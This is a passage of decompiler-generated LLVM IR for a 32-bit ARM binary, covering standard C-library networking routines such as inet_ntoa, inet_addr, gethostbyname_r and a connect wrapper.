  br label %dec_label_pc_15ec8

dec_label_pc_15ec8:                               ; preds = %dec_label_pc_15eb4, %dec_label_pc_15ec4
  %storemerge = phi i32 [ ptrtoint (i32* @global_var_202d6.960 to i32), %dec_label_pc_15ec4 ], [ ptrtoint ([3 x i8]* @global_var_202d4.958 to i32), %dec_label_pc_15eb4 ]
  store i32 %storemerge, i32* @r5, align 4
  %v0_15ec8 = call i32 @__GI___h_errno_location()
  %v1_15ecc = inttoptr i32 %v0_15ec8 to i32*
  %v2_15ecc = load i32, i32* %v1_15ecc, align 4
  %tmp10 = icmp ult i32 %v2_15ecc, 5
  br i1 %tmp10, label %bb, label %bb9

bb:                                               ; preds = %dec_label_pc_15ec8
  %v8_15edc = mul i32 %v2_15ecc, 4
  %v9_15edc = add i32 %v8_15edc, ptrtoint ([5 x i8*]* @global_var_202b0.956 to i32)
  %v10_15edc = inttoptr i32 %v9_15edc to i32*
  %v11_15edc = load i32, i32* %v10_15edc, align 4
  br label %bb9

bb9:                                              ; preds = %dec_label_pc_15ec8, %bb
  %storemerge3 = phi i32 [ %v11_15edc, %bb ], [ ptrtoint ([15 x i8]* @global_var_202c4.949 to i32), %dec_label_pc_15ec8 ]
  %v0_15ee4 = load i32, i32* @r4, align 4
  %v2_15ee8 = load i32, i32* @global_var_288dc, align 4
  store i32 %v2_15ee8, i32* @r0, align 4
  %v0_15ef0 = load i32, i32* @r5, align 4
  %v9_15ef8 = call i32 @fprintf(i32 %v2_15ee8, i32 ptrtoint ([8 x i8]* @global_var_2023c.965 to i32), i32 %v0_15ee4, i32 %v0_15ef0, i32 %storemerge3)
  ret i32 %v9_15ef8

; uselistorder directives
  uselistorder i32 %v2_15ecc, { 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8*]* @global_var_202b0.956 to i32), { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %dec_label_pc_15ec8, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %v3_15f1c = load i32, i32* @r4, align 4
  %v6_15f1c = load i32, i32* @r5, align 4
  %v9_15f1c = load i32, i32* @r6, align 4
  %v0_15f20 = load i32, i32* @r0, align 4
  %v2_15f40 = call i32 @llvm.bswap.i32(i32 %v0_15f20)
  %v0_15f44 = load i32, i32* @r1, align 4
  %v1_15f44 = add i32 %v0_15f44, 15
  store i32 %v1_15f44, i32* @ip, align 4
  br label %dec_label_pc_15f70

dec_label_pc_15f50:                               ; preds = %dec_label_pc_15f70
  %v1_15f74 = urem i32 %v0_15f84, 256
  %v5_15f58 = inttoptr i32 %v0_15f90 to i8*
  %v6_15f58 = call i32 @_uintmaxtostr(i8* %v5_15f58, i32 %v1_15f74, i32 0, i32 -10, i32 0)
  %v0_15f5c = load i32, i32* @r6, align 4
  %v2_15f5c = icmp eq i32 %v0_15f5c, 0
  %v1_15f60 = add i32 %v6_15f58, -1
  store i32 %v1_15f60, i32* @ip, align 4
  br i1 %v2_15f5c, label %dec_label_pc_15f70.backedge, label %bb

dec_label_pc_15f70.backedge:                      ; preds = %bb, %dec_label_pc_15f50
  %storemerge.pre = phi i32 [ %storemerge.pre.pre, %bb ], [ %v1_15f60, %dec_label_pc_15f50 ]
  %v0_15f70.pre = load i32, i32* @r5, align 4
  %v0_15f74.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15f70

bb:                                               ; preds = %dec_label_pc_15f50
  %v4_15f68 = inttoptr i32 %v0_15f5c to i8*
  store i8 46, i8* %v4_15f68, align 1
  %storemerge.pre.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_15f70.backedge

dec_label_pc_15f70:                               ; preds = %dec_label_pc_15f70.backedge, %entry
  %v0_15f90 = phi i32 [ %v1_15f44, %entry ], [ %storemerge.pre, %dec_label_pc_15f70.backedge ]
  %storemerge = phi i32 [ 0, %entry ], [ %storemerge.pre, %dec_label_pc_15f70.backedge ]
  %v0_15f84 = phi i32 [ %v2_15f40, %entry ], [ %v0_15f74.pre, %dec_label_pc_15f70.backedge ]
  %v0_15f88 = phi i32 [ 0, %entry ], [ %v0_15f70.pre, %dec_label_pc_15f70.backedge ]
  store i32 %storemerge, i32* @r6, align 4
  %v7_15f70 = icmp eq i32 %v0_15f88, 3
  store i1 %v7_15f70, i1* @cpsr_z, align 1
  %v3_15f84 = udiv i32 %v0_15f84, 256
  store i32 %v3_15f84, i32* @r4, align 4
  %v1_15f88 = add i32 %v0_15f88, 1
  store i32 %v1_15f88, i32* @r5, align 4
  %v7_15f8c = icmp sgt i32 %v0_15f88, 3
  br i1 %v7_15f8c, label %dec_label_pc_15f90, label %dec_label_pc_15f50

dec_label_pc_15f90:                               ; preds = %dec_label_pc_15f70
  %v1_15f90 = add i32 %v0_15f90, 1
  store i32 %v3_15f1c, i32* @r4, align 4
  store i32 %v6_15f1c, i32* @r5, align 4
  store i32 %v9_15f1c, i32* @r6, align 4
  ret i32 %v1_15f90

; uselistorder directives
  uselistorder i32 %v0_15f88, { 2, 0, 1 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2ec6c.967 to i32), i32* @r1, align 4
  %v0_15fa0 = call i32 @__GI_inet_ntoa_r()
  %v0_15fa4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15fa4, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v2_15fa4 = load i32, i32* @ip, align 4
  %v3_15fa4 = udiv i32 %v2_15fa4, 16777216
  %v4_15fa4 = mul i32 %v2_15fa4, 256
  %v5_15fa4 = or i32 %v3_15fa4, %v4_15fa4
  %v8_15fa4 = and i32 %v5_15fa4, %arg1
  store i32 %v8_15fa4, i32* @lr, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_15fa0

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_15fac = ptrtoint i32* %stack_var_-8 to i32
  %v0_15fb4 = load i32, i32* @r0, align 4
  %v2_15fb4 = inttoptr i32 %v0_15fb4 to i8*
  %v3_15fb4 = call i32 @inet_aton(i8* %v2_15fb4, i32 %v2_15fac)
  %v2_15fb8 = icmp eq i32 %v3_15fb4, 0
  br i1 %v2_15fb8, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_15fc0 = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_15fc8 = phi i32 [ -1, %entry ], [ %v3_15fc0, %bb ]
  ret i32 %v5_15fc8

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_15fcc = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_15fd8 = call i32 @__GI___h_errno_location()
  %v2_15fdc = ptrtoint i32* %stack_var_-12 to i32
  %v0_15fe8 = load i32, i32* @r4, align 4
  %v7_15ff8 = call i32 @gethostbyname_r(i32 %v0_15fe8, i32* nonnull @global_var_2ee48.969, i32 ptrtoint (i32* @global_var_2ec7c.971 to i32), i32 460, i32 %v2_15fdc, i32 %v0_15fd8)
  %v3_15ffc = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_15fcc, i32* @r4, align 4
  ret i32 %v3_15ffc
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_16010 = load i32, i32* @r5, align 4
  %v9_16010 = load i32, i32* @r6, align 4
  %v12_16010 = load i32, i32* @r7, align 4
  %v15_16010 = load i32, i32* @r8, align 4
  %v18_16010 = load i32, i32* @sb, align 4
  %v21_16010 = load i32, i32* @sl, align 4
  %v24_16010 = load i32, i32* @fp, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %v0_16020 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16020, i32* @fp, align 4
  %v2_16020 = icmp eq i32 %v0_16020, 0
  store i32 0, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg4, i32* @r4, align 4
  %v2_16030 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_16030, align 4
  br i1 %v2_16020, label %bb, label %dec_label_pc_1603c

bb:                                               ; preds = %entry
  %v1_16034 = load i32, i32* %r0.global-to-local, align 4
  %v2_16034 = add i32 %v1_16034, 22
  store i32 %v2_16034, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16360

dec_label_pc_1603c:                               ; preds = %entry
  %v0_1603c = call i32 @__errno_location()
  store i32 %v0_1603c, i32* %r0.global-to-local, align 4
  %v3_16040 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_16040, i32* %ip.global-to-local, align 4
  %v1_16044 = inttoptr i32 %v0_1603c to i32*
  %v2_16044 = load i32, i32* %v1_16044, align 4
  store i32 %v2_16044, i32* @r8, align 4
  %v0_16048 = load i32, i32* @r6, align 4
  store i32 %v0_16048, i32* %v1_16044, align 4
  %v0_1604c = load i32, i32* %ip.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_1603c, i32* @r5, align 4
  %v0_1605c = load i32, i32* @fp, align 4
  store i32 %v0_1605c, i32* %r0.global-to-local, align 4
  %v0_16060 = load i32, i32* @sl, align 4
  store i32 %v0_16060, i32* %r2.global-to-local, align 4
  %v0_16064 = load i32, i32* @r7, align 4
  store i32 %v0_16064, i32* %r3.global-to-local, align 4
  %v0_16068 = load i32, i32* @r4, align 4
  %v7_16070 = call i32 @__get_hosts_byname_r(i32 %v0_1605c, i32 2, i32 %v0_16060, i32 %v0_16064, i32 %v0_16068, i32 %v0_1604c, i32 %arg6)
  store i32 %v7_16070, i32* %r0.global-to-local, align 4
  %v2_16074 = icmp eq i32 %v7_16070, 0
  br i1 %v2_16074, label %dec_label_pc_16360, label %dec_label_pc_1607c

dec_label_pc_1607c:                               ; preds = %dec_label_pc_1603c
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v1_16080 = inttoptr i32 %arg6 to i32*
  %v2_16080 = load i32, i32* %v1_16080, align 4
  store i32 %v2_16080, i32* %r3.global-to-local, align 4
  %v7_16084 = icmp eq i32 %v2_16080, 1
  br i1 %v7_16084, label %dec_label_pc_160a8, label %dec_label_pc_1608c

dec_label_pc_1608c:                               ; preds = %dec_label_pc_1607c
  %v7_1608c = icmp eq i32 %v2_16080, 4
  br i1 %v7_1608c, label %dec_label_pc_160a8, label %dec_label_pc_16094

dec_label_pc_16094:                               ; preds = %dec_label_pc_1608c
  %v3_16094 = icmp eq i32 %v2_16080, -1
  br i1 %v3_16094, label %dec_label_pc_1609c, label %dec_label_pc_16360

dec_label_pc_1609c:                               ; preds = %dec_label_pc_16094
  %v0_1609c = load i32, i32* @r5, align 4
  %v1_1609c = inttoptr i32 %v0_1609c to i32*
  %v2_1609c = load i32, i32* %v1_1609c, align 4
  store i32 %v2_1609c, i32* %r3.global-to-local, align 4
  %v7_160a0 = icmp eq i32 %v2_1609c, 2
  br i1 %v7_160a0, label %dec_label_pc_160a8, label %dec_label_pc_16360

dec_label_pc_160a8:                               ; preds = %dec_label_pc_1609c, %dec_label_pc_1608c, %dec_label_pc_1607c
  %v0_160a8 = load i32, i32* @r7, align 4
  %v1_160a8 = sub i32 0, %v0_160a8
  %v1_160ac = urem i32 %v1_160a8, 4
  store i32 %v1_160ac, i32* %r3.global-to-local, align 4
  %v2_160ac = icmp eq i32 %v1_160ac, 0
  %v0_160b0 = load i32, i32* @r8, align 4
  %v1_160b0 = load i32, i32* @r5, align 4
  %v2_160b0 = inttoptr i32 %v1_160b0 to i32*
  store i32 %v0_160b0, i32* %v2_160b0, align 4
  %v0_160d0.pre = load i32, i32* @r4, align 4
  br i1 %v2_160ac, label %dec_label_pc_160c8, label %dec_label_pc_160b8

dec_label_pc_160b8:                               ; preds = %dec_label_pc_160a8
  %v1_160b8 = load i32, i32* %r3.global-to-local, align 4
  %v2_160b8 = sub i32 %v0_160d0.pre, %v1_160b8
  %v3_160b8 = icmp ult i32 %v0_160d0.pre, %v1_160b8
  br i1 %v3_160b8, label %dec_label_pc_1635c, label %dec_label_pc_160c0

dec_label_pc_160c0:                               ; preds = %dec_label_pc_160b8
  store i32 %v2_160b8, i32* @r4, align 4
  %v0_160c4 = load i32, i32* @r7, align 4
  %v2_160c4 = add i32 %v0_160c4, %v1_160b8
  store i32 %v2_160c4, i32* @r7, align 4
  br label %dec_label_pc_160c8

dec_label_pc_160c8:                               ; preds = %dec_label_pc_160a8, %dec_label_pc_160c0
  %v0_160d0 = phi i32 [ %v2_160b8, %dec_label_pc_160c0 ], [ %v0_160d0.pre, %dec_label_pc_160a8 ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %v1_16080, align 4
  %tmp31 = icmp ult i32 %v0_160d0, 4
  br i1 %tmp31, label %dec_label_pc_1635c, label %dec_label_pc_160dc

dec_label_pc_160dc:                               ; preds = %dec_label_pc_160c8
  %v0_160dc = load i32, i32* @r4, align 4
  %v1_160dc = add i32 %v0_160dc, -4
  store i32 %v1_160dc, i32* %r3.global-to-local, align 4
  %tmp32 = icmp ult i32 %v1_160dc, 8
  br i1 %tmp32, label %dec_label_pc_1635c, label %dec_label_pc_160e8

dec_label_pc_160e8:                               ; preds = %dec_label_pc_160dc
  %v1_160e8 = add i32 %v0_160dc, -12
  store i32 %v1_160e8, i32* %r3.global-to-local, align 4
  %v0_160ec = load i32, i32* @r7, align 4
  %v1_160ec = add i32 %v0_160ec, 4
  store i32 %v1_160ec, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v3_160f8 = inttoptr i32 %v1_160ec to i32*
  store i32 %v0_160ec, i32* %v3_160f8, align 4
  %v0_160fc = load i32, i32* @r5, align 4
  %v1_160fc = load i32, i32* @sb, align 4
  %v2_160fc = add i32 %v1_160fc, 4
  %v3_160fc = inttoptr i32 %v2_160fc to i32*
  store i32 %v0_160fc, i32* %v3_160fc, align 4
  %tmp33 = icmp ult i32 %v1_160e8, 32
  br i1 %tmp33, label %dec_label_pc_1635c, label %dec_label_pc_16104

dec_label_pc_16104:                               ; preds = %dec_label_pc_160e8
  %v0_16104 = load i32, i32* @r4, align 4
  %v1_16104 = add i32 %v0_16104, -44
  store i32 %v1_16104, i32* @r8, align 4
  %tmp34 = icmp ult i32 %v1_16104, 256
  br i1 %tmp34, label %dec_label_pc_1635c, label %dec_label_pc_16110

dec_label_pc_16110:                               ; preds = %dec_label_pc_16104
  %v0_16110 = load i32, i32* @r7, align 4
  %v1_16110 = add i32 %v0_16110, 44
  store i32 %v1_16110, i32* @r6, align 4
  %v1_16114 = add i32 %v0_16110, 12
  store i32 %v1_16114, i32* %r3.global-to-local, align 4
  %v0_16118 = load i32, i32* @fp, align 4
  store i32 %v0_16118, i32* @r1, align 4
  store i32 %v1_16104, i32* %r2.global-to-local, align 4
  store i32 %v1_16110, i32* %r0.global-to-local, align 4
  %v3_16128 = call i32 @strncpy(i32 %v1_16110, i32 %v0_16118, i32 %v1_16104)
  store i32 %v1_16114, i32* %ip.global-to-local, align 4
  %v0_16130 = load i32, i32* @r6, align 4
  %v1_16130 = load i32, i32* @r7, align 4
  %v2_16130 = add i32 %v1_16130, 12
  %v3_16130 = inttoptr i32 %v2_16130 to i32*
  store i32 %v0_16130, i32* %v3_16130, align 4
  %v0_16134 = load i32, i32* @fp, align 4
  store i32 %v0_16134, i32* %r0.global-to-local, align 4
  %v0_16138 = load i32, i32* @r5, align 4
  %v1_16138 = load i32, i32* %ip.global-to-local, align 4
  %v2_16138 = add i32 %v1_16138, 4
  %v3_16138 = inttoptr i32 %v2_16138 to i32*
  store i32 %v0_16138, i32* %v3_16138, align 4
  %v0_1613c = load i32, i32* @r7, align 4
  %v2_16140 = inttoptr i32 %v0_16134 to i8*
  %v3_16140 = call i32 @inet_aton(i8* %v2_16140, i32 %v0_1613c)
  store i32 %v3_16140, i32* %r0.global-to-local, align 4
  %v2_16144 = icmp eq i32 %v3_16140, 0
  br i1 %v2_16144, label %dec_label_pc_16188, label %dec_label_pc_16150

dec_label_pc_16150:                               ; preds = %dec_label_pc_16110
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_16154 = load i32, i32* @sl, align 4
  %v2_16154 = add i32 %v1_16154, 8
  %v3_16154 = inttoptr i32 %v2_16154 to i32*
  store i32 2, i32* %v3_16154, align 4
  %v0_16158 = load i32, i32* %r3.global-to-local, align 4
  %v2_16158 = mul i32 %v0_16158, 2
  %v1_1615c = load i32, i32* @sl, align 4
  %v2_1615c = add i32 %v1_1615c, 12
  %v3_1615c = inttoptr i32 %v2_1615c to i32*
  store i32 %v2_16158, i32* %v3_1615c, align 4
  %v3_16160 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_16160, i32* %r2.global-to-local, align 4
  store i32 %v1_16114, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  %v0_1616c = load i32, i32* @r5, align 4
  store i32 %v0_1616c, i32* %r0.global-to-local, align 4
  %v0_16170 = load i32, i32* @sl, align 4
  %v2_16170 = inttoptr i32 %v3_16160 to i32*
  store i32 %v0_16170, i32* %v2_16170, align 4
  %v0_16174 = load i32, i32* @r6, align 4
  %v1_16174 = load i32, i32* @sl, align 4
  %v2_16174 = inttoptr i32 %v1_16174 to i32*
  store i32 %v0_16174, i32* %v2_16174, align 4
  %v0_16178 = load i32, i32* @sb, align 4
  %v1_16178 = load i32, i32* @sl, align 4
  %v2_16178 = add i32 %v1_16178, 16
  %v3_16178 = inttoptr i32 %v2_16178 to i32*
  store i32 %v0_16178, i32* %v3_16178, align 4
  %v0_1617c = load i32, i32* %r3.global-to-local, align 4
  %v1_1617c = load i32, i32* @sl, align 4
  %v2_1617c = add i32 %v1_1617c, 4
  %v3_1617c = inttoptr i32 %v2_1617c to i32*
  store i32 %v0_1617c, i32* %v3_1617c, align 4
  %v0_16180 = load i32, i32* @r5, align 4
  %v1_16180 = load i32, i32* %ip.global-to-local, align 4
  %v2_16180 = inttoptr i32 %v1_16180 to i32*
  store i32 %v0_16180, i32* %v2_16180, align 4
  br label %dec_label_pc_16360

dec_label_pc_16188:                               ; preds = %dec_label_pc_16110
  %v2_16188 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_16188, i32* @r5, align 4
  %v1_1618c = call i32 @__open_nameservers(i32 0)
  store i32 ptrtoint (i32* @global_var_28c0c.973 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_16188, i32* @r0, align 4
  store i32 95952, i32* %r3.global-to-local, align 4
  %v1_161a4 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_176c8.894 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28c0c.973 to i32), i32* %r0.global-to-local, align 4
  %v1_161b4 = call i32 @__pthread_return_0()
  store i32 %v2_16188, i32* @r0, align 4
  %v2_161c0 = load i32, i32* @global_var_2ef80.978, align 4
  store i32 %v2_161c0, i32* @r4, align 4
  store i32 95952, i32* %r3.global-to-local, align 4
  %v1_161d0 = call i32 @__pthread_return_void()
  %v2_161dc = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_2ef74.981 to i32), i32* %r3.global-to-local, align 4
  %v0_161e8 = load i32, i32* @fp, align 4
  store i32 %v0_161e8, i32* %r0.global-to-local, align 4
  %v2_161ec = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_161ec, i32* %ip.global-to-local, align 4
  %v0_161f0 = load i32, i32* @r4, align 4
  store i32 %v0_161f0, i32* %r2.global-to-local, align 4
  %v6_16204 = inttoptr i32 %v0_161e8 to i8*
  %v7_16204 = call i32 @__dns_lookup(i8* %v6_16204, i32 1, i32 %v0_161f0, i32 ptrtoint (i32* @global_var_2ef74.981 to i32), i32 %v2_161dc, i32 %v2_161ec)
  store i32 %v7_16204, i32* %r0.global-to-local, align 4
  %v1_16208 = icmp slt i32 %v7_16204, 0
  br i1 %v1_16208, label %.dec_label_pc_16334_crit_edge, label %dec_label_pc_16218

.dec_label_pc_16334_crit_edge:                    ; preds = %dec_label_pc_16188
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16334

dec_label_pc_16218:                               ; preds = %dec_label_pc_16188
  store i32 256, i32* %r3.global-to-local, align 4
  %v1_1622c = load i32, i32* @r8, align 4
  %tmp35 = icmp ugt i32 %v1_1622c, 255
  br i1 %tmp35, label %dec_label_pc_162c8, label %dec_label_pc_16234

dec_label_pc_16234:                               ; preds = %dec_label_pc_16218
  %v3_16234 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_16234, i32* %r0.global-to-local, align 4
  %v1_16238 = call i32 @free(i32 %v3_16234)
  %v3_1623c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_1623c, i32* %r0.global-to-local, align 4
  %v1_16240 = call i32 @free(i32 %v3_1623c)
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %v1_16080, align 4
  br label %dec_label_pc_16360

dec_label_pc_162c8:                               ; preds = %dec_label_pc_16218
  %v3_162cc.pre = load i32, i32* %stack_var_-96, align 4
  %v0_162d0.pre = load i32, i32* @r6, align 4
  store i32 %v1_1622c, i32* %r2.global-to-local, align 4
  store i32 %v3_162cc.pre, i32* @r1, align 4
  store i32 %v0_162d0.pre, i32* %r0.global-to-local, align 4
  %v3_162d4 = call i32 @strncpy(i32 %v0_162d0.pre, i32 %v3_162cc.pre, i32 %v1_1622c)
  %v3_162d8 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_162d8, i32* %r0.global-to-local, align 4
  %v1_162dc = call i32 @free(i32 %v3_162d8)
  store i32 %v1_162dc, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %v7_162e4 = icmp eq i32 %tmp7, 1
  br i1 %v7_162e4, label %dec_label_pc_162ec, label %dec_label_pc_16340

dec_label_pc_162ec:                               ; preds = %dec_label_pc_162c8
  store i32 4, i32* @r2, align 4
  %v0_162f4 = load i32, i32* @r7, align 4
  store i32 %v0_162f4, i32* @r0, align 4
  %v0_162f8 = call i32 @memcpy()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v1_16114, i32* %r2.global-to-local, align 4
  %v1_16304 = load i32, i32* @sl, align 4
  %v2_16304 = add i32 %v1_16304, 8
  %v3_16304 = inttoptr i32 %v2_16304 to i32*
  store i32 2, i32* %v3_16304, align 4
  %v0_16308 = load i32, i32* %r3.global-to-local, align 4
  %v2_16308 = mul i32 %v0_16308, 2
  store i32 %v2_16308, i32* %r3.global-to-local, align 4
  %v1_1630c = load i32, i32* @sl, align 4
  %v2_1630c = add i32 %v1_1630c, 12
  %v3_1630c = inttoptr i32 %v2_1630c to i32*
  store i32 %v2_16308, i32* %v3_1630c, align 4
  %v3_16310 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_16310, i32* %r0.global-to-local, align 4
  %v0_16314 = load i32, i32* @r6, align 4
  %v1_16314 = load i32, i32* @sl, align 4
  %v2_16314 = inttoptr i32 %v1_16314 to i32*
  store i32 %v0_16314, i32* %v2_16314, align 4
  %v0_16318 = load i32, i32* @sb, align 4
  %v1_16318 = load i32, i32* @sl, align 4
  %v2_16318 = add i32 %v1_16318, 16
  %v3_16318 = inttoptr i32 %v2_16318 to i32*
  store i32 %v0_16318, i32* %v3_16318, align 4
  %v0_1631c = load i32, i32* %r2.global-to-local, align 4
  %v1_1631c = load i32, i32* @sl, align 4
  %v2_1631c = add i32 %v1_1631c, 4
  %v3_1631c = inttoptr i32 %v2_1631c to i32*
  store i32 %v0_1631c, i32* %v3_1631c, align 4
  %v1_16320 = call i32 @free(i32 %v3_16310)
  %v3_16324 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_16324, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1632c = load i32, i32* @sl, align 4
  %v2_1632c = inttoptr i32 %v3_16324 to i32*
  store i32 %v0_1632c, i32* %v2_1632c, align 4
  %v0_16330 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_16330, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16334

dec_label_pc_16334:                               ; preds = %.dec_label_pc_16334_crit_edge, %dec_label_pc_162ec
  %v0_16338 = phi i32 [ 1, %.dec_label_pc_16334_crit_edge ], [ %v0_16330, %dec_label_pc_162ec ]
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 %v0_16338, i32* %v1_16080, align 4
  br label %dec_label_pc_16360

dec_label_pc_16340:                               ; preds = %dec_label_pc_162c8
  %v3_16340 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_16340, i32* %r0.global-to-local, align 4
  %v1_16344 = call i32 @free(i32 %v3_16340)
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %v1_16080, align 4
  br label %dec_label_pc_16360

dec_label_pc_1635c:                               ; preds = %dec_label_pc_160b8, %dec_label_pc_16104, %dec_label_pc_160e8, %dec_label_pc_160dc, %dec_label_pc_160c8
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16360

dec_label_pc_16360:                               ; preds = %bb, %dec_label_pc_1609c, %dec_label_pc_16094, %dec_label_pc_1603c, %dec_label_pc_16340, %dec_label_pc_16334, %dec_label_pc_16234, %dec_label_pc_16150, %dec_label_pc_1635c
  store i32 %v6_16010, i32* @r5, align 4
  store i32 %v9_16010, i32* @r6, align 4
  store i32 %v12_16010, i32* @r7, align 4
  store i32 %v15_16010, i32* @r8, align 4
  store i32 %v18_16010, i32* @sb, align 4
  store i32 %v21_16010, i32* @sl, align 4
  store i32 %v24_16010, i32* @fp, align 4
  %v29_16364 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_16364

; uselistorder directives
  uselistorder i32 %v2_16308, { 1, 0 }
  uselistorder i32 %v1_1622c, { 1, 2, 0 }
  uselistorder i32 %v1_16114, { 1, 2, 0, 3 }
  uselistorder i32 %v1_16110, { 1, 0, 2 }
  uselistorder i32 %v1_16104, { 2, 1, 0, 3 }
  uselistorder i32 %v0_160d0.pre, { 0, 2, 1 }
  uselistorder i32 %v1_160ac, { 1, 0 }
  uselistorder i32* %v1_16080, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_16020, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 24, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 17, 15, 16, 18, 20, 19, 21, 23, 22, 26, 25, 0, 1, 2 }
  uselistorder i32 %arg6, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_16360, { 8, 4, 5, 6, 7, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1635c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_16334, { 1, 0 }
  uselistorder label %dec_label_pc_160c8, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16384 = load i32, i32* @r4, align 4
  store i32 %v3_16384, i32* %stack_var_-8, align 4
  %v5_16388 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_16388, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_16388, -4095
  br i1 %tmp, label %dec_label_pc_163a8, label %dec_label_pc_16398

dec_label_pc_16398:                               ; preds = %entry
  %v0_16398 = call i32 @__errno_location()
  %v0_1639c = load i32, i32* %r4.global-to-local, align 4
  %v1_1639c = sub i32 0, %v0_1639c
  %v2_163a0 = inttoptr i32 %v0_16398 to i32*
  store i32 %v1_1639c, i32* %v2_163a0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_163a8

dec_label_pc_163a8:                               ; preds = %entry, %dec_label_pc_16398
